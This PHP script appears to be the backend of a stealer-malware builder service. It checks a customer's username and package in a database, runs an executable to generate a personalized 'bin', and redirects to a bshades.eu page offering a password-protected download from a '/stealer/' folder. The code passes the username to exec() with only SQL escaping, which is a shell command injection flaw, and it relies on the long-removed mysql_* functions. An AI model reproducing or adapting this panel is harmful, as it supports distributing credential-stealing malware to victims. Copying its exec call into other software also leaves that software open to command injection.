<?php
//require_once('inc\_top.php');
?>
<HEAD>

<style type="text/css">

.buttonSubmitHide {
 display: none;
}

</style>
</HEAD>
<?php

if(isset($_POST['submit']))
{

require_once("config.php");
$link = mysql_connect(DB_SERVER, DB_USER, DB_PASSWORD);
	if(!$link) {
		die('Failed to connect to server: ' . mysql_error());
	}
	
	$db = mysql_select_db(DB_DATABASE);
	if(!$db) {
		die("Unable to select database");
	}
			
			$user = mysql_real_escape_string($_REQUEST['username_value']);
			$result = mysql_query("SELECT `username` FROM `tbl_users` WHERE `username` = '$user';", $link);
			$count = mysql_num_rows($result);
			
			if ($count == 0)
				$err = $err . "The username " . $ref . " does not exist! <br>";
			else {
				$sql = "SELECT * FROM `tbl_users` WHERE `username` = ". "'" . $user . "';";
				$answer = mysql_query($sql);
				
				while($row = mysql_fetch_array($answer, MYSQL_ASSOC)) {
					$userID += $row['id'];
					$typeID += $row['package'];
				}
			}
			
						
			function base64_url_encode($input) {
				return strtr(base64_encode($input), '+/=', '-_,');
			}

			function base64_url_decode($input) {
				return base64_decode(strtr($input, '-_,', '+/='));
			}
			
			if (!empty($err)) {
							$status = base64_url_encode("error");
							$msg = base64_url_encode($err);
							echo '<script>
							<!--
							window.location= "http://bshades.eu/recbuild.php?status=' . $status . '&response=' . $msg . '"
							//-->
							</script>';
				} else {
							exec("cgg.exe " . $userID . " " . $typeID . " " . $user . ".exe");
							$status = base64_url_encode("success");
							$msg = base64_url_encode('Your bin has been generated! You may download it <a href="http://bshades.eu/stealer/' . $user . '.rar">here</a>.<br>The password to the archive file is ' . $user . ".");
							echo '<script>
							<!--
							window.location= "http://bshades.eu/recbuild.php?status=' . $status . '&response=' . $msg . '"
							//-->
							</script>';
			}
			
			
			
			
				
				
				
			


} else {
	echo "";
?>


<?php
}
?>

<?php
//require_once('inc\_bottom.php');
?>